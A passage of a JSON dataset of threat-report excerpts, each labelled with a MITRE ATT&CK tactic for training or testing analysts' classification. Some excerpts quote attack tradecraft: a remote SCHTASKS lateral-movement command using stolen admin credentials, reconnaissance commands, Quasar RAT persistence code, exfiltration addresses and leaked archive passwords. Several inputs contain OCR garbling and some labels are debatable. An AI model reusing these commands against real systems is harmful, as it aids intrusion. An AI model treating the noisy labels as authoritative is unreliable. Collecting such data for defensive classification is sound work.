        "input": "Described attack activity: After gaining initial access, the threat actor began executing scripts, as shown in table 3. \nTable 3: Execution techniques ",
        "output": "execution",
        "source": "Mitre"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: We observed that the domain mymst007[.]info is used to download further payloads. The domain was created five years ago. We have seen similar reports that make mention of the same infrastructure. Attacks associated with this domain include the same or similar tactics techniques and procedures (TTPs).\nConnections related to the domain  mymst007[.]info",
        "output": "command and control",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The attackers used RDP to connect to systems, including with privileged accounts. They connected to NAS servers via SSH and used tools like mRemoteNG, smbexec, wmiexec, PAExec, and PsExec for remote host communication. ",
        "output": "lateral movement",
        "source": "securelist"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The primary objective of a threat actor will always be to get the highest privileges needed to accomplish their goal(s). We examined a variety of methods used to achieve this goal. These methods range from using legitimate accounts tosetting up scheduled tasksand using certain vulnerabilities that, if exploited, could provide the threat actors with privileged permissions.\nThe statistics of the TTPs utilized for privilege escalation are shown in the graphic below:\nWe observed the use of known CVEs during our reports in 2022, allowing the various TAs to have privileged access on the compromised machines. These vulnerabilities are designated asCVE-2020-1472(Zerologon) andCVE-2021-44077(referring to ManageEngine SupportCenter Plus), respectively.\nIn theQbot and Zerologon Lead To Full Domain Compromisereport we sawZeroLogonand in theWill the Real Msiexec Please Stand Up? Exploit Leads to Data Exfiltrationreport we saw the RCE for SupportCenter Plus:\nIn order to assist the initial or ongoing execution of malicious code, adversaries may make use of task scheduling features. All popular operating systems provide tools for scheduling scripts or programs to run at a given time and date. If the appropriate authentication requirements are satisfied, a task can also be scheduled on a remote machine. Although, being a privileged user is usually required to accomplish that.\nThe reportQbot Likes to Move It, Move Itprovides an illustration of this circumstance:",
        "output": "privilege escalation",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: A Cobalt Strike beacon was executed on a critical asset (backup host in this intrusion) within the network using the following command:\nRemote process execution achieved using WMI invoking Rundll32 to load the 143.dll (Cobalt Strike beacon) on the target host:\nThe Cobalt Strike beacon (143.dll) injected into the svchost process 'svchost.exe -k UnistackSvcGroup -s CDPUserSvc':\nFollowed by a request to checkauj[.]com (82.117.252.143). Approximately 9 hours later, the attacker established an RDP session via the 143.dll. This was achieved very early in the intrusion, and we were able to correlate the activity:\nDuring this event, we believe that the attacker disclosed the remote workstation name 'win-344vu98d3ru'.",
        "output": "lateral movement",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: On the second day of the intrusion, FileZilla was installed on one of the servers which used SFTP to exfiltrate data to a remote computer at IP address 192.52.167.210.\nUsing Netflow, we were able to confirm that some amount of data (~200MB) was exfiltrated out of the environment.\nHere we can see the threat actor actively exfiltrating our information using FileZilla.\nWe also saw the threat actors exfiltrate databases by dragging and dropping information into FileZilla.\nAfter pivoting to a Domain Controller, the threat actors dumped lsass using Task Manager:\nAnd then uploaded the dump file toufile.iousing Internet Explorer on a server.",
        "output": "exfiltration",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The observed DOUBLEDROP instances contain a well-designed backdoor implemented as a 32 or 64- bit PE dynamic library which we track as DOUBLEBACK. The backdoor is initially mapped into the same PowerShell process started by the bootstrap script, but it will then inject itself into a msiexec.exe process if certain conditions are met. By design, the core of the backdoor functionality is intended to be executed after injected into a newly spawned msiexec.exe process. \nIn contrast with other backdoors DOUBLEBACK does not have its services hardcoded and the functionality is expected to be implemented as plugins that are expected to be serialized in the registry database under a host-specific registry path. That way, the backdoor can be configured to implement a flexible set of services depending on the target. With all the common functionality implemented as plugins, the backdoor's main goal is to establish a communication framework ensuring data integrity between the C2 server and the appropriate plugins. \nThe backdoor starts by retrieving its process name and ensures that it is either powershell.exe or msiexec.exe. In all other cases, the malware will immediately terminate itself. Normally, when first started on the system, the backdoor will be injected into the same PowerShell process that executes both the bootstrap code and the launcher. In that mode the malware may spawn (depending on certain conditions) a msiexec process and injects itself into it. More details about the logic implemented in the PowerShell and the msiexec branches are provided in the following sections. \nNext, the backdoor ensures that it is the only DOUBLEBACK instance currently executing on the compromised system. To do that, the malware generates a host-based pseudo-unique GUID and uses it as a mutex name. The algorithm first generates a pseudo-unique host identifier that is based on the system volume's serial number and a hardcoded salt value, as shown in Figure 10. \nThe UNC2529 Triple Double: A Trifecta Phishing Campaign | Mandiant | Google Cloud Blo Next, the malware passes the generated host ID to another algorithm that generates a pseudo-unique GUID based on the input, as shown in Figure 11. \nOnce the GUID is generated the malware formats it as Global\\{<guid>} and attempts to open a mutex with that name. In case the mutex is already created the backdoor assumes that another instance of itself is already running and terminates itself. Otherwise, the backdoor creates the mutex and branches out depending on the detected process it currently mapped into. ",
        "output": "other",
        "source": "mandiant"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Since January 2016, discreet campaigns involving malware called Trojan.Odinaff have targeted a number of financial organizations worldwide. These attacks appear to be extremely focused on organizations operating in the banking, securities, trading, and payroll sectors. Organizations who provide support services to these industries are also of interest.\nOdinaff is typically deployed in the first stage of an attack, to gain a foothold onto the network, providing a persistent presence and the ability to install additional tools onto the target network. These additional tools bear the hallmarks of a sophisticated attacker which has plagued the financial industry since at least 2013\u2013Carbanak. This new wave of attacks has also used some infrastructure that has previously been used in Carbanak campaigns.\nThese attacks require a large amount of hands on involvement, with methodical deployment of a range of lightweight back doors and purpose built tools onto computers of specific interest. There appears to be a heavy investment in the coordination, development, deployment, and operation of these tools during the attacks. Custom malware tools, purpose built for stealthy communications (Backdoor.Batel), network discovery, credential stealing, and monitoring of employee activity are deployed.\nAlthough difficult to perform, these kinds of attacks on banks can be highly lucrative. Estimates of total losses to Carbanak-linked attacks range from tens of millions to hundreds of millions of dollars.",
        "output": "other",
        "source": "Symentec"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: reconnaissance activity using built-in Windows commands to gather information on the compromised server, rounding out the initial reconnaissance phase: \nsysteminfo net start net user dir c:\\ ",
        "output": "other",
        "source": "github_aptNote"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Across Microsoft, we use statistical models and machine learning to uncover threats hidden in billions of low-fidelity signals. The threat actor tracking model we introduced in this blog is exciting work with real impact in customer protection. We are still in the early stages of realizing the value of this approach, yet we already have had much success, especially in detecting and informing customers about human-operated attacks, which are some of the most prevalent and impactful threats today. \nA core reason for this success is the combination of statistical expertise, threat hunting, and the very intensive work of vetting and discovering the combination of TTPs that indicate specific threat groups.  Our ability to automatically identify threat actors from the data, predict next steps, and stop attacks is foundational for much of our work going forward, with many as-yet unrealized benefits in customer protection. In real terms, we have accelerated threat hunting to drive to conclusions that lead to real protection, and we will continue expanding that protection for our customers through the Microsoft Threat Experts service and the coordinated defense delivered by Microsoft 365 Defender. ",
        "output": "other",
        "source": "microsoft"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Threat Intelligence shows that LAPSUS $\\$9$ utilise multiple methods to gain Initial access. \nThe main source of initial access is believed to occur via stolen authentication cookies which would grant the attacker access to a specific application. These cookies are usually in the form of Single sign-on (SSO) applications which would allow the attacker to pivot into other corporate applications ultimately bypassing controls such as multifactor authentication (MFA). ",
        "output": "initial access",
        "source": "github_aptNote"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: T1583.003: Virtual Private Server T1584: Compromise Infrastructure T1588.004: Digital Certificates T1608.003: Install Digital Certificate T1608.005: Link Target ",
        "output": "other",
        "source": "mandiant"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Exploit kits are constantly active, evolving, and compromising users. Talos is $\\mathbf{\\widetilde{e}}\\mathbf{\\widetilde{e}}$ mmitted to not only protecting our users by developing content to block these threats, but to exposing how they operate and working with providers to eliminate them from the threat landscape. As we've seen in the past the relationship between threat researchers and hosting providers is key to this success. This is another example of how a willing provider can help expose the activities of the adversaries and in turn hopefully discourage them from being leveraged for this type of behavior in the future. \nProject Aspis was created specifically for this function. To those hosting providers that are in a position to help please don't hesitate to reach out to us at Talos. Whether there is a threat in your environment currently or not, we are always looking to foster these relationships. It's this type of industry cooperation that is key to helping prevent this type of threat from affecting people around the globe. \nThis research marks an interesting change in exploit kit behavior in a move towards more targeted compromise. As researchers have continued to pick apart the exploit kits as they operate inside the US/UK, the adversaries are evolving. This is similar to the same way they evolve the kit itself as we build protections against the kits themselves. This particular Nuclear actor focused its efforts on non-English countries to avoid the competition and visibility associated with attacking those users. Obviously it's impossible to avoid victims in these countries, but by focusing their efforts on non-English speaking users they appeared to have increased their elusiveness. \nAs long as adversaries are using these kits to compromise users we will remain vigilant in hunting down the activity, protecting our users, as well as exposing the activity to the world. ",
        "output": "other",
        "source": "Cisco"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The Trickbot payload (1a5f3ca6597fcccd3295ead4d22ce70b.exe) was manually executed on a single endpoint. The visual representation of process tree execution pattern on beachhead can be seen below.\nUpon execution, the payload injects into the wermgr.exe process.\nThe injected wermgr.exe process then creates a new folder in the user's AppData directory. As typically seen in Trickbot infections, it drops a copy of itself into this folder along with its encrypted config (settings.ini) and a batch file (launcher.bat).\nTrickbot utilized the same instance of wermgr.exe to load Cobalt Strike beacons into memory using PowerShell, which remained active throughout the intrusion:\nThe fake setup installer (Setup1.exe) which was seen during the lateral movement stage, was dropped and executed on multiple systems, including the domain controllers.",
        "output": "execution",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Quasar achieves persistence by executing on startup, as seen in the source code shown in figure 4. To achieve persistence, Quasar uses two methods: scheduled tasks and registry keys. If the client process has administrator privileges, the client will generate a scheduled task via schtasks . The scheduled task is generated using the task name created in the client builder. The schedule task runs after the host user logs on, executes with the highest run level (i.e., the highest level of privilege), and suppresses any errors related to creating the task. If the process does not have administrator privileges, the scheduled task will only add a registry value. That registry value is added to the following key: \nHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run. \nThe value name is then configured in the client builder, and the client adds its current path as the startup program. \nif (WindowsAccountHelper.GetAccountType() $==$ \"Admin\") { try { ProcessStartInfo startInfo $=$ new ProcessStartInfo(\"schtasks\") \nArguments $=$ \"/create /tn \\\"\" $^+$ Settings.STARTUPKEY $^+$ \"\\\" /sc ONLOGON /tr \\\"\" $^+$ ClientData.CurrentPath $^+$ \"\\\" /rl HIGHEST /f\", \nUseShellExecute $=$ false, CreateNoWindow $=$ true }; \nProcess $\\uprho=$ Process.Start(startInfo) p.WaitForExit(1000); if (p.ExitCode $\\mathtt{=}\\mathtt{=}0$ ) return true; } catch (Exception) { } \nreturn   \nRegistryKeyHelper.AddRegistryKeyValue(RegistryHive.CurrentUser, \"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\",   \nSettings.STARTUPKEY, ClientData.CurrentPath, true); } else { return   \nRegistryKeyHelper.AddRegistryKeyValue(RegistryHive.CurrentUser, \"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\",   \nSettings.STARTUPKEY, ClientData.CurrentPath, true); ",
        "output": "persistence",
        "source": "github_aptNote"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: As  similarly seen in our previous reportExchange Exploit Leads to Domain Wide Ransomware, this threat actor utilized the Microsoft Exchange ProxyShell vulnerabilities; an exploit chain of 3 different CVEs:\nCVE-2021-34473 \nCVE-2021-34523 \nCVE-2021-31207\nWith the appropriatePowerShell loggingavailable we were able to recover the PowerShell commandlets executed on the Exchange server, which resulted in the creation of web shells on the host.\nOnce the threat actor had gained a valid privileged session using CVE-2021-34473 and CVE-2021-34523, they then ensured the default Administrator account had the correct role for mailbox importing and exporting:\nThe threat actor initiated a mailbox export that matched the search criteria ofSubject -eq 'aspx_wkggiyvttmu'to a provided location with the .aspx extension. While the file created is a legitimate .pst file, in it contains plaintext web shell code that is rendered by IIS when requested.\nIn an attempt to hide the actions taken, the actor removes the request just created:\nThis activity then repeated approximately 2 days after the initial exploitation. As the actor had already achieved remote execution by this point, there is a high likelihood the exploitation of Exchange servers is automated. Below is the second web shell created that shares the same naming convention as the first.",
        "output": "initial access",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Glupteba acquires persistence by adding an entry in the Run registry key. Thus, every time Windows boots up, Glupteba will be launched. Here's the entry that is created:\nHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\CloudNet =  \"%APPDATA%\\EpicNet Inc\\CloudNet\\cloudnet.exe\"\nOther entare also created in the Windows Registry. The most interesting are the following:\nHKCU\\Software\\EpicNet Inc.\\CloudNet\\Value = \"20180223\"HKCU\\Software\\EpicNet Inc.\\CloudNet\\GUID = \"CDC0432A-0298-40B1-9A71-D61F94C013A7\"\nThe GUID entry is set to the bot id that is created via a call to CoCreateGuid. As for the Value entry, it contains the PE timestamp of Glupteba's binary.",
        "output": "persistence",
        "source": "Weblive"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: T1078 Valid Accounts   \nT1078.004 Cloud Accounts   \nT1133 External Remote Services   \nT1189 Drive-by Compromise   \nT1190 Exploit Public-Facing Application   \nT1566 Phishing T1566.001 Spearphishing Attachment T1566.002 Spearphishing Link T1566.004 Spearphishing Voice ",
        "output": "initial access",
        "source": "mandiant"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: From the beachhead, WMIC was used to remotely execute '165.bat' on two other hosts.\nMultiple failed attempts were observed prior to the successful execution of a PowerShell Cobalt Strike loader via a service with \"SYSTEM\" privileges.\nDecoded Cobalt Strike shellcode, using Cyber Chef recipe:https://github.com/mattnotmax/cyberchef-recipes#recipe-28-de-obfuscation-of-cobalt-strike-beacon-using-conditional-jumps-to-obtain-shellcode",
        "output": "lateral movement",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: After the initial execution of the IcedID malware, it established persistence by creating a copy of the malware (Ulfefi32.dll) in the AppData directory of the affected user and created a scheduled task to execute it every hour. The task\\kajeavmeva_{B8C1A6A8-541E-8280-8C9A-74DF5295B61A}was created with the execution action below:",
        "output": "persistence",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The actor has distributed its dropper embedded in an archive file (\uc678\uad50\ubd80 \uac00\ud310 2021-05-07.zip) as an attachment through described in the previous section. The actor conducted this spearphishing attack on May 7, 2021. \nThe archive file contains a JavaScript file (\uc678\uad50\ubd80 \uac00\ud310 2021- 05-07.pdf.jse) which pretends to be a PDF file that contains two Base64 encoded blobs. The first one is the content of the decoy PDF file in Base64 format and the other one contains the AppleSeed payload also in Base64 format (encoded twice). \nAt first it uses the MSXML Base64 decoding functionality to decode the first layer and then uses certutil.exe to decode the second layer and get the final ApppleSeed payload. The decoy PDF file has been decoded using the MSXML Base64 decoding function. \nAfter decoding the PDF and AppleSeed payload, the content gets written into the ProgramData directory. At the end, the decoy PDF file is opened by calling Wscript.Shell.Run and the AppleSeed payload executed through PowerShell by calling regsvr32.exe. Calling regsvr32.exe to run a DLL registers it as a server that automatically calls the DLL export function that has been named DIlRegisterServer. \nWscript_Shell.Run(Pdf_Name); ",
        "output": "initial access",
        "source": "Mitre"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: BRONZE BUTLER typically creates a list of files (i.e., a shopping list) from compromised hosts and file-share servers. If the list is short, the group exfiltrates the files directly. For large lists, the threat actors use the following procedure: \n1. Use malware to upload the large list of enumerated files to the C2 server. \n2. Select specific files to steal, creating a new list. \n3. Use downloaders or other malware to send the new list to a compromised host. \n4. Use archiving software to collect files in a password-protected archive. \n5. Use an uploader or other malware to send the archived files to an attacker-controlled server. The uploader software is proprietary to this group, but Datper and xxmm also contain an uploading feature. When exfiltration is complete, the uploader (or Datper or xxmm) immediately uses the del command to delete the RAR archives. \nAR format for exfiltration. \nThe group uses a password to encrypt files for RAR archiving. CTU researchers have observed the following passwords used in BRONZE BUTLER network compromises: \n1234qwer   \n1234qwer!   \n1234\\$%qwer   \n1qazxsw2   \n1qazxcde32ws ",
        "output": "exfiltration",
        "source": "Mitre"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: RDP is a very useful but very complex component of Windows. Based on our analysis of the EsteemAudit exploit, we find that the vulnerability itself is not obscure, but it took quite a bit of effort to write a successful exploit. Interestingly, gpkcsp choose a global variable to store the data sent by the client, it supplies a capacity of controlling the arbitrary data in already-known address in the remote server without ASLR. This is a powerful feature for exploit authors to take advantage of. In any case, EsteemAudit is a reliable and powerful RDP exploit tool for Windows XP and Windows 2003. Users should take steps to ensure their Windows XP and Windows Server 2003 are protected through one of the mitigation steps listed above. A network vulnerability like this one can be used in a \"worm-able\" fashion, similar to the WanaCrypt0r attacks which had global impact earlier this month.\nRegister for Ignite '17 Security ConferenceVancouver, BC June 12\u201315, 2017\nIgnite '17 Security Conference is a live, four-day conference designed for today's security professionals. Hear from innovators and experts, gain real-world skills through hands-on sessions and interactive workshops, and find out how breach prevention is changing the security industry. Visit theIgnite websitefor more information on tracks, workshops and marquee sessions.",
        "output": "other",
        "source": "Palo"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: For lateral movement, the attackers used the Windows-native Schtasks command to create remote scheduled tasks, and to execute malicious code through the aforementioned batch files: \nSCHTASKS /Create /S <IP Address> /U <Username> /p <Password> /SC ONCE /TN test /TR<Path to aBatch File>/ST<Time>/RUSYSTEM \nThescheduledtaskcommandlineusedforlateralmovement \nThe scheduled tasks the attackers have created were created with the name test, using compromised Domain Administrator credentials. The batch file the scheduled task executed was executed from a temp folder using the local SYSTEM account. \nBy clicking \"Accept All Cookies\", you agree to the storing of cookies on your device to enhance site navigation, analyze site usage, and assist in our marketing efforts. ",
        "output": "lateral movement",
        "source": "Mitre"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: QBot PowerShell analysis\nWhen run for the first time, the script creates a new registry key entry in the same path, saving the date of execution. It then verifies upon execution if the creation date key of this registry key is older than 4 hours.\nBased on the outcome, it will either: (1) retrieve the base64-encoded Qbot payload from the Windows Registry, decode it, save it on the file system and execute it.\nOR (2) Fetch the QBot payload remotely using one of the active C2 IPs using theInvoke-WebRequestPowerShell module:\nThe PS script contains built-in logic to execute various types of payloads including batch and Visual Basic files.\nThe encoded QBot DLL that was stored in the registry, was dropped in the directory%APPDATA%\\Roaming\\Microsoft\\Fdopitcu. The unsigned DLL, with descriptorCancel Autoplay 2was executed usingregsvr32.exe\nUpon execution of this second-stage DLL, various registry keys were created inHKCU\\Software\\Microsoft\\Yerqbqokc.In addition, a new instance of explorer.exe (32-bit) was started and injected into.\nThe registry keys contain eight-character long hex strings for which we believe is part of the malware's encryptedconfig.",
        "output": "execution",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The threat actors injected into a high privileged process and then access cached credentials fromLSASS:\nRelated named pipe activity based on Cobalt Strike patterns for using Mimikatz Pass-The-Hash function to run local and remote commands. The named pipe was used to pass the results back to the Beacon process.\nWindows EID: 4673  A privileged service was called:",
        "output": "credential access",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Upon the execution of the IcedID sample, we observed a download and execution of a malicious DLLikaqkk.dll:\nBelow is a screenshot of packet where we can spot theGZIPLOADERdownloading the first stage from the C2:\nA detailedGZIPLOADERanalysis from Binary Defense is availablehere.\nThe DLL was then executed usingrundll32.exeone second later:\nCobalt strike BeaconDLLHost.exewas downloaded and loaded via process hollowing a few hours after the initialIcedIDexecution:\nThe threat actors connected to the machine to run the first discovery commands using Cobalt Strike Beacon. The threat actors then downloaded an additional Cobalt Strike Beaconkaslose.dllvia curl and executed it viaregsvr32:\nThe Threat actors also executed HTA and PowerShell loader to load Cobalt Strike Beacon in memory on beachhead:",
        "output": "execution",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Immediately following the execution of M1E1626.exe, a persistence mechanism was created for the file using a run key. This file was found to be aBazarBackdoor sample.",
        "output": "persistence",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The Excel document required the user to enable content to execute. The embedded macro in the file was using an Excel 4.0 macro, which at time of execution had a detection rate of 1/63 inVirustotal.\nUpon execution of the macro the file reached out to:\nAs seen in the contents of the macro below:\nFrom there a file was written:\nFrom here the executable then proceeds to create a new file and execute it via cmd.\nFour days post initial access, a Cobalt Strike Beacon was executed via rundll32 and cmd.",
        "output": "execution",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Once access is established, threat actors then need to enumerate the victim environment. Common initial discovery tools include Windows built-in utilities (net.exe, nltest.exe, systeminfo, ipconfig, whoami, etc) and theAdFindtool. In a few cases, adversaries attempted to get a listing of open ports/running services on remote hosts by performing port scans using tools such as Advanced IP Scanner and KPortScan 3.0.\nThe first thing we observe from hands-on keyboard operators is usually additional discovery activity. We see threat actors concentrate on searching for the Domain Controllers and general environmental information.\nThe statistics below illustrate the most used Windows tools for enumerating the environment. We compare each tool to the total percent of cases investigated.\nWe see the enumeration commands executed in a short time span, between 1-5 seconds. The execution is usually done through post-exploitation frameworks (Cobalt Strike in most cases).\nExample screenshot is taken from the case:From Zero to Domain Admin",
        "output": "discovery",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Affected organizations also included those in Luxembourg, France, the Philippines, Japan, Spain, Malaysia, Norway, and Romania. The targeted industries were consistent with other analyses: telecommunications (including internet service providers) and banking. We also saw a miscellany of targets whose industries comprise internet-related services (such as data center operations), management consulting, information technology, pharmaceutics, insurance, even aviation and education. \nIn the case of Taiwan, we've seen the compromised website diverting its visitors to another malware-hosting site that also acts as platform for C&C communication: sap[.]misapor[.]ch. We saw the affected websites of financial institutions in Uruguay and Mexico redirecting victims to the same URL. While the URL acts similarly to how eye-watch[.]in:443 delivers payloads, we also saw the URL leveraging and exploiting security flaws in Flash: CVE-2015-8651, CVE-2016-1019, and CVE-2016-4117. These vulnerabilities were patched last December 28 2015, April 5, 2016, and May 12, 2016, respectively. \nvaddr=0x0045e620paddr=0x0005d220ordinal=1046sz=20len=19 section=.rdata type=a string=kliyent2podklyuchit vaddr=0x0045e634 paddr=0x0005d234 ordinal=1047 sz=7 len=6 section=.rdata type=a string=ssylka vaddr=0x0045e63c paddr=0x0005d23c ordinal=1048 sz=13len=12 section=.rdata type=a string=ustanavlivat vaddr=0x0045e64c paddr=0x005d24c ordinal=1049 sz=9 len=8 section=.rdata type=a string=poluchit vaddr=0x0045e658 paddr=0x0005d258 ordinal=1050 sz=9 len=8 section=.rdata type=a string=pereslat vaddr=0x0045e664paddr=0x0005d264 ordinal=1051 sz=8len=7 section=.rdata type=a string=derzhat vaddr=0x0045e66c paddr=0x0005d26c ordinal=1052 sz=9 len=8 section=.rdata type=a string=vykhodit vaddr=0x0045e678 paddr=0x0005d278 ordinal=1053 sz=8 len=7 section=.rdata type=a string=Nachalo \n\u672c\u7db2\u7ad9\u4f7f\u7528cookies\u4ee5\u63d0\u4f9b\u6240\u9700\u7684\u7db2\u7ad9\u529f\u80fd,\u6d41\u91cf\u5206\u6790,\u793e\u7fa4\u5a92\u9ad4\u529f\u80fd,\u4ee5\u53ca\u66f4\u512a\u8cea\u8207\u500b\u4eba\u5316\u7684\u8a0a\u606f.\u6211\u5011\u7684cookie \u8072\u660e\u63d0\u4f9b\u66f4\u8a73\u7d30\u8cc7\u8a0a\u53ca\u5982\u4f55\u8abf\u6574\u76ee\u524dcookie\u8a2d\u5b9a \u4e86\u89e3\u66f4\u591a\nRussian-transliterated from Cyrillic script to Latin alphabet, in particular. The verbs used were in their infinitive form, however, which is awkward for a command switch. Case in point: the use of \"ustanavlivat\" (\"to install\") instead of the more command-like \"ustanovit\" (\"do install\"), which gives the impression that the malware operator lifted it from a dictionary or source where words are typically listed in default form. \nAdditionally, using verbs as commands is peculiar, especially for Russian cybercriminals or malware programmers who ironically eschew using Russian language in favor of broken English. Majority-if not all-of Russian programmers know that \"connect\" is keyed in as \"connect\", because there's already an API call (Application Program Interface) under that name. If you really have to use Russian, you'd rather use words like \"vykhod\" (\"quit\") than \"vikhodit\" (\"to exit\"). \nAnother example is the use of \"klyent2podklychit\" we found within the sample we analyzed. The only intelligible part of it was ${}^{\\prime\\prime}2{}^{\\prime\\prime},$ , which can be taken as \"to\" given how there's an API call name for it (client2connect). In Russian, it's practically gibberish, with the words wrongly ordered; it makes much more sense if \"podkluchit_klienta\" was used instead. \nIndeed, with the awkward use of Russian language within the malware, \nLazarus. ",
        "output": "impact",
        "source": "Mitre"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Once started, the Keydnap backdoor installs a plist file in /Library/LaunchAgents/ if it has root privileges or $\\$1$ USER/Library/LaunchAgents/ otherwise to achieve persistence across reboots. The Library/Application Support/com.apple.iCloud.sync.daemon directory is used to keep the icloudsyncd executable. This directory will also contain the process id of the running malware in process.id and a \"build name\" (as it is called by the author) in build.id. With administrator privileges, it will also change the owner of icloudsyncd to root:admin and make the executable setuid and setgid, which means it will always run as root in the future. \nps ax on an infected system: ",
        "output": "persistence",
        "source": "Mitre"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: We assess with medium to high confidence that the QBot infection was delivered to the system via a malspam campaign through a hidden 4.0 Macro's in Excel.\nWe believethisis the xls file that lead to the Qbot infection, due to the overlap in time period, download url, and file name.",
        "output": "initial access",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The data exfiltration process runs in the following sequence: The temp.ini files are copied into a text file that matches the pattern: \nFrom <COMPUTER-NAME> (<Month>-<Day> <Hour>-<Minute>-<Second>).txt. For example, From <COMPUTER-NAME> (01-04 11-40-02).txt \nAll the text files are now packed into the archive temp.zip (%temp%\\temp.zip) zip is Base64 encoded (with a custom key, same as that used in the malicious document) and then copied to post.txt   \ntxt is uploaded to the control server ",
        "output": "exfiltration",
        "source": "Mitre"
    },
    {
